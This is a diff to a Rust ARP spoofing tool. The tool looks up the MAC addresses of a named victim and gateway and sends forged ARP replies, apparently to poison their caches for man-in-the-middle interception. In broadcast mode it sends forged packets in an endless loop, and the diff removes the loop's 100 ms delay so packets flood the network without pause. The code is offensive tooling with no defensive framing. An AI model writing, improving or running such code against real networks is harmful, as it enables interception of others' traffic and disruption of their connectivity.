@@ -7,7 +7,6 @@ use std::io::{self, Write, stdin};
 use std::net::Ipv4Addr;
 use std::str::FromStr;
 use std::thread;
-use std::time::Duration;
 
 pub(crate) fn main() {
     print!("Mode (broadcast/targeted): ");
@@ -73,6 +72,7 @@ pub(crate) fn main() {
                     }
                 }
             });
+
             loop {
                 let mut arp_buffer = [0u8; 28];
                 let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();
@@ -92,11 +92,10 @@ pub(crate) fn main() {
                 ethernet_packet.set_ethertype(EtherTypes::Arp);
                 ethernet_packet.set_payload(arp_packet.packet_mut());
                 let _ = tx.send_to(ethernet_packet.packet(), None);
-                thread::sleep(Duration::from_millis(100));
             }
         } else if let Some(victim_ip_addr) = victim_ip_addr {
             let victim_ip = victim_ip_addr;
-            let victim_mac = mac::find_mac(&iface, &victim_ip.to_string(), "Victim")
+            let victim_mac = mac::find_mac(&iface, &victim_ip_addr.to_string(), "Victim")
                 .expect("Victim MAC not found. Is the host up?");
             let gateway_mac = mac::find_mac(&iface, &gateway_ip_addr.to_string(), "Gateway")
                 .expect("Gateway MAC not found. Is the host up?");
@@ -131,8 +130,11 @@ pub(crate) fn main() {
             ethernet_packet2.set_ethertype(EtherTypes::Arp);
             ethernet_packet2.set_payload(arp_packet2.packet_mut());
 
+
             tx.send_to(ethernet_packet1.packet(), None);
             tx.send_to(ethernet_packet2.packet(), None);
+
+
         }
     }
 }
